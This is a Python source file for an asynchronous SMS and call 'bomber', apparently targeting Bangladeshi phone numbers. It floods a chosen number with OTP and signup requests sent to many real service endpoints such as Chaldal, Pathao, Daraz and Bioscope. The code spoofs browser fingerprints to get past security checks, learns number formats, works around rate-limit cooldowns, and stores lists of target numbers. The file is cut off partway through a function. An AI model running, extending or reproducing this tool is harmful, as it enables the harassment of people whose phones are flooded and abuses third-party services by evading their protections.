import json
import asyncio
import aiohttp
import random
import string
import os
import sys
import logging
import re
from datetime import datetime
from contextvars import ContextVar
from urllib.parse import urlparse

# Colors
R, G, Y, B, P, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m', '\033[1;37m'

current_api_fmt = ContextVar("current_api_fmt", default=None)
VERSION = '1.1.5'
facebook_url = 'https://www.facebook.com/tasfia600?'
github = 'https://github.com/Quincunx33'

class NumberFormatter:
    @staticmethod
    def format(number, format_type):
        if len(number) == 11 and number.startswith('0'):
            if format_type == 'no_zero': return number[1:]
            if format_type == '880': return '88' + number
            if format_type == '+880': return '+88' + number
        return number

class SmartAPIController:
    def __init__(self):
        self.api_data_file = "api_learning_data.json"
        self.learning_data = self.load_learning_data()
        self.formats = ['raw', '880', '+880']  # Improved list
        self.exploring = {}  # Track APIs in exploration mode
        self.format_queue = {}  # Queue of formats to try
        self.cooldowns = {}

    def load_learning_data(self):
        if os.path.exists(self.api_data_file):
            try:
                with open(self.api_data_file, "r") as f:
                    return json.load(f)
            except:
                pass
        return {}

    def save_learning_data(self):
        with open(self.api_data_file, "w") as f:
            json.dump(self.learning_data, f, indent=4)

    def get_format(self, api_name):
        """Returns the best format. If unknown, explores different formats."""
        if api_name in self.cooldowns:
            if asyncio.get_event_loop().time() < self.cooldowns[api_name]:
                return None  # Blocked
            else:
                del self.cooldowns[api_name]

        # Use learned format if available
        if api_name in self.learning_data:
            return self.learning_data[api_name]['best_format']

        # Setup exploration for new API
        if api_name not in self.exploring:
            f_list = self.formats.copy()
            random.shuffle(f_list)
            self.format_queue[api_name] = f_list
            self.exploring[api_name] = True

        # Try next format in queue
        if api_name in self.format_queue and self.format_queue[api_name]:
            return self.format_queue[api_name].pop(0)
        else:
            # All formats failed or queue empty, default to raw
            return 'raw'

    def report_result(self, api_name, format_used, success, status_code):
        if success and status_code in [200, 201]:
            # Learn successful format
            self.learning_data[api_name] = {'best_format': format_used}
            self.save_learning_data()
            # Stop exploration
            self.exploring.pop(api_name, None)
            self.format_queue.pop(api_name, None)
        elif status_code == 429:
            # Block for 300 seconds on rate limit
            self.cooldowns[api_name] = asyncio.get_event_loop().time() + 300
            self.exploring.pop(api_name, None)
            self.format_queue.pop(api_name, None)
        # For other failures, exploration continues with the next format in get_format()

    def is_blocked(self, api_name):
        if api_name in self.cooldowns:
            if asyncio.get_event_loop().time() < self.cooldowns[api_name]:
                return True
            else:
                del self.cooldowns[api_name]
        return False

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    placeholders = [R, G, C, Y, P, B]
    sc = random.choice(placeholders)
    logo = rf'''{sc}                                                    
                    _.:._
                  ."\ | /".
{R}.,__              "=.\:/.="              {R}__,.
 {R}"=.`"=._{G}            /^\            {R}_.="`.="
   ".'.'."{B}=.=.=.=.-,/   \,-{B}.=.=.=.=".{sc}'.'."
     `~.`.{P}`.`.`.`.`.     .'.'.'.'.'.'{sc}.~`
        `~.`` {P}` `{sc}.`.\   /.'{P}.' ' ''{sc}.~`
            `=.-~~-._ ) ( _.-~~-.=`
                    `\ /`
                     ( )
                      Y

{R}SMS/Call{W} {G}Bombing{W}, and {G}Smart Learning{W}, and {G}Dynamic Payload{W} with {G}Stealth Mode{W}.
'''
    print(logo)
    print(f'{G}[+] {C}Version     : {W}{VERSION}')
    print(f'{G}[+] {C}Created By  : {W}tasfiya')
    print(f'{G}[+] {C}Facebook    : {W}{facebook_url}')
    print(f'{G}[+] {C}Github      : {W}{github}')
    print(f'____________________________________________________________________________\n')
    print(f'{B}[~] {R}Note :{G} Smart Learning system enabled. API formats will be learned automatically.{W}\n')

def generate_dynamic_ua():
    platforms = ['Windows', 'Android', 'iOS', 'macOS', 'Linux']
    platform = random.choice(platforms)
    chrome_v = f"{random.randint(130, 135)}.0.{random.randint(6000, 7000)}.{random.randint(10, 150)}"
    webkit_v = "537.36"
    
    if platform == 'Windows':
        win_v = random.choice(['10.0', '11.0'])
        arch = random.choice(['Win64; x64', 'WOW64'])
        return f"Mozilla/5.0 (Windows NT {win_v}; {arch}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v}"
    elif platform == 'Android':
        android_v = random.randint(11, 15)
        model = random.choice(['SM-S928B', 'SM-G991B', 'Pixel 8 Pro', 'Pixel 9 Pro XL', 'Xiaomi 14 Ultra', 'CPH2451', 'M2101K6G'])
        return f"Mozilla/5.0 (Linux; Android {android_v}; {model}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Mobile Safari/{webkit_v}"
    elif platform == 'iOS':
        ios_v = random.choice(['16_6', '17_4_1', '17_5', '18_0', '18_1'])
        device = random.choice(['iPhone', 'iPad'])
        return f"Mozilla/5.0 ({device}; CPU iPhone OS {ios_v} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ios_v.split('_')[0]}.0 Mobile/15E148 Safari/604.1"
    elif platform == 'macOS':
        mac_v = random.choice(['10_15_7', '11_6', '12_5', '13_4', '14_1'])
        return f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mac_v}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v}"
    else: # Linux
        return f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v}"

def get_random_name():
    return ''.join(random.choices(string.ascii_letters, k=8))

def get_random_email():
    return f"{get_random_name()}@gmail.com"

def get_random_phone():
    return "01" + "".join(random.choices(string.digits, k=9))

# --- New Features: Save System & Settings ---

DATA_FILE = "bomber_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {"saved_numbers": {}, "settings": {"stealth_mode": False, "external_only": False}}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def save_number(name, number):
    data = load_data()
    data["saved_numbers"][name] = number
    save_data(data)
    logging.info(f"{G}[✓] Number saved successfully!{W}")

def list_saved_numbers():
    data = load_data()
    numbers = data.get("saved_numbers", {})
    if not numbers:
        print(f"{R}[!] No saved numbers found.{W}")
        input(f"\n{C}Press Enter to return...{W}")
        return None
    
    print(f"\n{Y}--- Saved Numbers ---{W}")
    keys = list(numbers.keys())
    for i, name in enumerate(keys, 1):
        print(f"{C}[{i}] {name}: {numbers[name]}{W}")
    
    choice = input(f"\n{Y}[?] Select a number (or 'b' to go back): {W}")
    if choice.lower() == 'b':
        return None
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(keys):
            return numbers[keys[idx]]
    except:
        pass
    return None

async def settings_menu():
    while True:
        clear()
        banner()
        data = load_data()
        settings = data.get("settings", {})
        
        stealth_status = f"{G}ON{W}" if settings.get("stealth_mode") else f"{R}OFF{W}"
        external_only_status = f"{G}ON{W}" if settings.get("external_only") else f"{R}OFF{W}"
        
        print(f"{Y}--- Settings ---{W}")
        print(f"{C}[1] Stealth Mode: {stealth_status}")
        print(f"{C}[2] External API Only: {external_only_status} {Y}(Disable Internal APIs){W}")
        print(f"{C}[3] Clear Saved Numbers")
        print(f"{C}[4] Manage External APIs")
        print(f"{C}[B] Back to Main Menu")
        
        choice = input(f"\n{Y}[?] Select Option: {W}").lower()
        
        if choice == '1':
            settings["stealth_mode"] = not settings.get("stealth_mode")
        elif choice == '2':
            settings["external_only"] = not settings.get("external_only")
        elif choice == '3':
            confirm = input(f"{R}[!] Are you sure you want to clear all saved numbers? (y/n): {W}").lower()
            if confirm == 'y':
                data["saved_numbers"] = {}
                logging.info(f"{G}[✓] All numbers cleared!{W}")
                await asyncio.sleep(1)
        elif choice == '4':
            await manage_external_apis()
        elif choice == 'b':
            break
        
        data["settings"] = settings
        save_data(data)

async def manage_external_apis():
    file_path = "external_apis.json"
    while True:
        clear()
        banner()
        if os.path.exists(file_path):
            try:
                with open(file_path, "r") as f:
                    apis = json.load(f)
            except:
                apis = []
        else:
            apis = []
            
        print(f"{Y}--- External API Management ---{W}")
        if not apis:
            print(f"{R}[!] No external APIs configured.{W}")
        else:
            for i, api in enumerate(apis, 1):
                status = f"{G}[Connected]{W}" if api.get("enabled", True) else f"{R}[Disconnected]{W}"
                print(f"{C}[{i}] {api.get('name')} {status}")
                print(f"    {W}URL: {api.get('url')}")
                print(f"    {W}Method: {api.get('method')} | Mode: {api.get('mode')}")
                if api.get("payload"):
                    print(f"    {W}Payload: {json.dumps(api.get('payload'))}")
                print("-" * 40)
        
        print(f"{G}[A] Add New API")
        print(f"{R}[D] Delete API")
        print(f"{Y}[T] Toggle Connect/Disconnect")
        print(f"{B}[B] Back")
        
        choice = input(f"{Y}[?] Select Option: {W}").lower()
        
        if choice == 'a':
            name = input(f"{C}[?] API Name: {W}")
            url = input(f"{C}[?] API URL (use {{phone}} for target): {W}")
            method = input(f"{C}[?] Method (GET/POST, default POST): {W}").upper() or "POST"
            mode = input(f"{C}[?] Mode (sms/call, default sms): {W}").lower() or "sms"
            
            payload = {}
            if method == "POST":
                print(f"{Y}[*] Enter JSON payload (e.g. {{\"phone\": \"{{phone}}\"}}). Leave empty for none.{W}")
                p_input = input(f"{C}[?] Payload: {W}")
                if p_input:
                    try:
                        payload = json.loads(p_input)
                    except:
                        print(f"{R}[!] Invalid JSON. Using empty payload.{W}")
            
            apis.append({
                "name": name,
                "url": url,
                "method": method,
                "mode": mode,
                "payload": payload,
                "enabled": True
            })
            with open(file_path, "w") as f:
                json.dump(apis, f, indent=4)
            print(f"{G}[✓] API Added!{W}")
            await asyncio.sleep(1)
            
        elif choice == 'd':
            if not apis: continue
            idx = input(f"{R}[?] Enter API number to delete: {W}")
            try:
                idx = int(idx) - 1
                if 0 <= idx < len(apis):
                    del apis[idx]
                    with open(file_path, "w") as f:
                        json.dump(apis, f, indent=4)
                    print(f"{G}[✓] API Deleted!{W}")
                else:
                    print(f"{R}[!] Invalid number.{W}")
            except:
                pass
            await asyncio.sleep(1)
            
        elif choice == 't':
            if not apis: continue
            idx = input(f"{Y}[?] Enter API number to toggle: {W}")
            try:
                idx = int(idx) - 1
                if 0 <= idx < len(apis):
                    apis[idx]["enabled"] = not apis[idx].get("enabled", True)
                    with open(file_path, "w") as f:
                        json.dump(apis, f, indent=4)
                    status = "Connected" if apis[idx]["enabled"] else "Disconnected"
                    print(f"{G}[✓] API {status}!{W}")
                else:
                    print(f"{R}[!] Invalid number.{W}")
            except:
                pass
            await asyncio.sleep(1)
            
        elif choice == 'b':
            break






def smart_api(func):
    async def wrapper(self, *args, **kwargs):
        parts = func.__name__.split('___')
        if len(parts) > 1:
            api_id = parts[0].replace('api_', '').upper()
            api_name_part = parts[1].replace('_', ' ').title()
            display_name = f'{api_id} - {api_name_part}'
        else:
            display_name = func.__name__

        if self.smart.is_blocked(display_name):
            return False
            
        fmt = self.smart.get_format(display_name)
        original_target = self.target
        self.target = NumberFormatter.format(original_target, fmt)
        
        token = current_api_fmt.set(fmt)
        try:
            result = await func(self, *args, **kwargs)
            return result
        finally:
            self.target = original_target
            current_api_fmt.reset(token)
    return wrapper


class AsyncBomber:
    def __init__(self, target, limit, mode='sms', stop_event=None, concurrency=50):
        self.target = target
        self.limit = limit # 0 means infinite
        self.mode = mode
        self.sent = 0
        self.failed = 0
        self.running = True
        self.stop_event = stop_event if stop_event else asyncio.Event()
        self.log_file = f"bombing_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.session = None # aiohttp session will be created later
        self.api_cooldowns = {} # Tracks cooldown for each API
        self.backoff_time = 30 # Initial backoff time in seconds
        self.request_batch_duration = 120 # Time in seconds to send requests before resting (2 minutes)
        self.rest_duration = 10 # Time in seconds to rest after a batch
        self.semaphore = asyncio.Semaphore(concurrency) # Limit concurrent requests to 10
        self.smart = SmartAPIController()
        self.external_apis = self.load_external_apis()

        with open(self.log_file, "w") as f:
            f.write(f"Bombing Session Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target: {self.target} | Mode: {self.mode.upper()}\n")
            f.write("-" * 60 + "\n")

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()

    def load_external_apis(self):
        file_path = "external_apis.json"
        if os.path.exists(file_path):
            try:
                with open(file_path, "r") as f:
                    return json.load(f)
            except Exception as e:
                logging.error(f"Error loading external APIs: {e}")
        return []

    async def run_external_api(self, api_config):
        name = api_config.get("name", "Unknown External API")
        url = api_config.get("url", "").replace("{phone}", self.target)
        method = api_config.get("method", "POST").upper()
        payload_template = api_config.get("payload", {})
        extra_headers = api_config.get("headers", {})

        # Prepare payload by replacing {phone}
        payload = {}
        if isinstance(payload_template, dict):
            for k, v in payload_template.items():
                if isinstance(v, str):
                    payload[k] = v.replace("{phone}", self.target)
                else:
                    payload[k] = v
        
        try:
            headers = self.get_headers(url, extra=extra_headers)
            if method == "GET":
                async with self.session.get(url, headers=headers, timeout=10) as res:
                    res_text = await res.text()
                    success = res.status in [200, 201]
                    await self.log_event(f"[EXT] {name}", success, res.status, response_text=res_text)
                    return success
            else:
                async with self.session.post(url, json=payload, headers=headers, timeout=10) as res:
                    res_text = await res.text()
                    success = res.status in [200, 201]
                    await self.log_event(f"[EXT] {name}", success, res.status, response_text=res_text)
                    return success
        except Exception as e:
            await self.log_event(f"[EXT] {name}", False, "Error", response_text=str(e))
            return False

    def get_headers(self, url=None, extra=None):
        """Generates advanced, dynamic, and platform-specific headers to bypass modern security systems."""
        user_agent = generate_dynamic_ua()
        
        # Determine platform and browser for Sec-Ch-Ua
        platform = "Unknown"
        if "iPhone" in user_agent or "iPad" in user_agent: platform = "iOS"
        elif "Android" in user_agent: platform = "Android"
        elif "Windows NT" in user_agent: platform = "Windows"
        elif "Macintosh" in user_agent: platform = "macOS"
        elif "Linux" in user_agent: platform = "Linux"

        # Extract major version from UA for Sec-Ch-Ua
        chrome_match = re.search(r'Chrome/(\d+)', user_agent)
        chrome_v = chrome_match.group(1) if chrome_match else "132"

        # Generate advanced Client-Hints
        sec_ch_ua = f'"Not_A Brand";v="8", "Chromium";v="{chrome_v}", "Google Chrome";v="{chrome_v}"'
        sec_ch_ua_mobile = "?1" if platform in ["iOS", "Android"] else "?0"
        sec_ch_ua_platform = f'"{platform}"'

        headers = {
            "User-Agent": user_agent,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-US,en;q=0.9,bn;q=0.8", "bn-BD,bn;q=0.9,en-US;q=0.8,en;q=0.7"]),
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json; charset=UTF-8",
            "Connection": "keep-alive",
            "Sec-Ch-Ua": sec_ch_ua,
            "Sec-Ch-Ua-Mobile": sec_ch_ua_mobile,
            "Sec-Ch-Ua-Platform": sec_ch_ua_platform,
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site" if url and "facebook.com" not in url else "cross-site",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        if url:
            parsed = urlparse(url)
            headers["Host"] = parsed.netloc
            headers["Origin"] = f"{parsed.scheme}://{parsed.netloc}"
            headers["Referer"] = f"{parsed.scheme}://{parsed.netloc}/"

        if extra:
            headers.update(extra)
            
        return headers
    async def log_event(self, api_name, success, status_code=None, fmt=None, response_text=None):
        # Improved success detection: check for common failure keywords in response body
        if success and response_text:
            failure_keywords = ["failed", "error", "invalid", "limit", "wrong", "denied", "blocked", "unauthorized", "forbidden"]
            if any(kw in response_text.lower() for kw in failure_keywords):
                success = False
                status_code = f"FakeSuccess({status_code})"

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        status = f"{G}SUCCESS{W}" if success else f"{R}FAILED{W}"
        
        # Enhanced log entry with more details
        log_entry = f"[{timestamp}] API: {api_name:20} | Status: {status:15} | Code: {status_code:10} | Format: {str(fmt):10}\n"
        if response_text and not success:
            log_entry += f"    Response: {response_text[:100]}...\n"

        with open(self.log_file, "a") as f:
            f.write(log_entry)

        if success:
            self.sent += 1
            if fmt is not None: self.smart.report_result(api_name, fmt, True, status_code)
            color = G
            icon = "✓"
        else:
            self.failed += 1
            if fmt is not None: self.smart.report_result(api_name, fmt, False, status_code)
            color = R
            icon = "✗"
            
        # Display to console with enhanced formatting
        print(f"{W}[{timestamp}] {color}[{icon}] {api_name:20} {W}| {color}{status:7} {W}| Code: {Y}{status_code}{W}")
            
        # Add to cooldown if failed
        if not success and status_code and status_code != "Error":
            self.api_cooldowns[api_name.lower()] = asyncio.get_event_loop().time() + 60

    # SMS APIs

    @smart_api
    async def api_api109___chaldal_otp(self):
        target = self.target
        url = "https://chaldal.com/api/customer/SendOTP"
        try:
            async with self.session.post(url, json={"phoneNumber": target}, headers=self.get_headers(url), timeout=10) as res:
                res_text = await res.text()
                success = res.status in [200, 201]
                await self.log_event("API109 - Chaldal OTP", success, res.status, fmt=current_api_fmt.get(), response_text=res_text)
                return success
        except Exception:
            await self.log_event("API109 - Chaldal OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api110___pathao_otp(self):
        target = self.target
        url = "https://api.pathao.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API110 - Pathao OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API110 - Pathao OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api111___sharetrip_otp(self):
        target = self.target
        url = "https://api.sharetrip.net/api/v1/otp/send"
        try:
            async with self.session.post(url, json={"mobile": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API111 - ShareTrip OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API111 - ShareTrip OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api112___shohoz_otp(self):
        target = self.target
        url = "https://www.shohoz.com/api/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API112 - Shohoz OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API112 - Shohoz OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api113___foodpanda_otp(self):
        target = self.target
        url = "https://www.foodpanda.com.bd/api/v1/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API113 - Foodpanda OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API113 - Foodpanda OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api114___hungrynaki_otp(self):
        target = self.target
        url = "https://api.hungrynaki.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API114 - HungryNaki OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API114 - HungryNaki OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api115___rokomari_otp(self):
        target = self.target
        url = "https://www.rokomari.com/api/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API115 - Rokomari OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API115 - Rokomari OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api116___evaly_otp(self):
        target = self.target
        url = "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API116 - Evaly OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API116 - Evaly OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api117___amarpay_otp(self):
        target = self.target
        url = "https://api.amarpay.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API117 - AmarPay OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API117 - AmarPay OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api118___pickaboo_otp(self):
        target = self.target
        url = "https://api.pickaboo.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API118 - Pickaboo OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API118 - Pickaboo OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api119___ajkerdeal_otp(self):
        target = self.target
        url = "https://api.ajkerdeal.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API119 - AjkerDeal OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API119 - AjkerDeal OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api120___priyoshop_otp(self):
        target = self.target
        url = "https://api.priyoshop.com/v1/auth/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API120 - PriyoShop OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API120 - PriyoShop OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api121___bikroy_otp_v2(self):
        target = self.target
        url = "https://bikroy.com/data/authenticate/otp/send"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API121 - Bikroy OTP V2", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API121 - Bikroy OTP V2", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api122___daraz_otp_v2(self):
        target = self.target
        url = "https://member.daraz.com.bd/user/api/sendOtp"
        try:
            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API122 - Daraz OTP V2", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API122 - Daraz OTP V2", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api1_redx_signup(self):
        target = self.target
        url = "https://api.redx.com.bd:443/v1/user/signup"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API1 - RedX Signup": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API1 - RedX Signup": pass
            elif "Bioscope" in "API1 - RedX Signup": payload = {"number": "+88" + target}
            elif "Proiojon" in "API1 - RedX Signup": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API1 - RedX Signup": payload = {"phone": target}
            elif "Medha" in "API1 - RedX Signup": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API1 - RedX Signup": payload = {"number": "+88" + target}
            elif "Robi" in "API1 - RedX Signup": payload = {"phone_number": target}
            elif "Arogga" in "API1 - RedX Signup": payload = {"mobile": target}
            elif "MyGP" in "API1 - RedX Signup": pass
            elif "BDSTall" in "API1 - RedX Signup": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API1 - RedX Signup": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API1 - RedX Signup": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API1 - RedX Signup": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API1 - RedX Signup": payload = {"phoneNumber": target}
            elif "Sindabad" in "API1 - RedX Signup": payload = {"mobile": target}
            elif "Kirei" in "API1 - RedX Signup": payload = {"phone": target}
            elif "Shikho" in "API1 - RedX Signup": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API1 - RedX Signup": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API1 - RedX Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API1 - RedX Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API1 - RedX Signup", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api2_khaasfood_otp(self):
        target = self.target
        url = "https://api.khaasfood.com/api/app/one-time-passwords/token?username={phone}"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API2 - KhaasFood OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API2 - KhaasFood OTP": pass
            elif "Bioscope" in "API2 - KhaasFood OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API2 - KhaasFood OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API2 - KhaasFood OTP": payload = {"phone": target}
            elif "Medha" in "API2 - KhaasFood OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API2 - KhaasFood OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API2 - KhaasFood OTP": payload = {"phone_number": target}
            elif "Arogga" in "API2 - KhaasFood OTP": payload = {"mobile": target}
            elif "MyGP" in "API2 - KhaasFood OTP": pass
            elif "BDSTall" in "API2 - KhaasFood OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API2 - KhaasFood OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API2 - KhaasFood OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API2 - KhaasFood OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API2 - KhaasFood OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API2 - KhaasFood OTP": payload = {"mobile": target}
            elif "Kirei" in "API2 - KhaasFood OTP": payload = {"phone": target}
            elif "Shikho" in "API2 - KhaasFood OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API2 - KhaasFood OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API2 - KhaasFood OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API2 - KhaasFood OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API2 - KhaasFood OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api3_bioscope_login(self):
        target = self.target
        url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API3 - Bioscope Login": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API3 - Bioscope Login": pass
            elif "Bioscope" in "API3 - Bioscope Login": payload = {"number": "+88" + target}
            elif "Proiojon" in "API3 - Bioscope Login": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API3 - Bioscope Login": payload = {"phone": target}
            elif "Medha" in "API3 - Bioscope Login": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API3 - Bioscope Login": payload = {"number": "+88" + target}
            elif "Robi" in "API3 - Bioscope Login": payload = {"phone_number": target}
            elif "Arogga" in "API3 - Bioscope Login": payload = {"mobile": target}
            elif "MyGP" in "API3 - Bioscope Login": pass
            elif "BDSTall" in "API3 - Bioscope Login": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API3 - Bioscope Login": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API3 - Bioscope Login": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API3 - Bioscope Login": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API3 - Bioscope Login": payload = {"phoneNumber": target}
            elif "Sindabad" in "API3 - Bioscope Login": payload = {"mobile": target}
            elif "Kirei" in "API3 - Bioscope Login": payload = {"phone": target}
            elif "Shikho" in "API3 - Bioscope Login": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API3 - Bioscope Login": payload = {"phone": target}
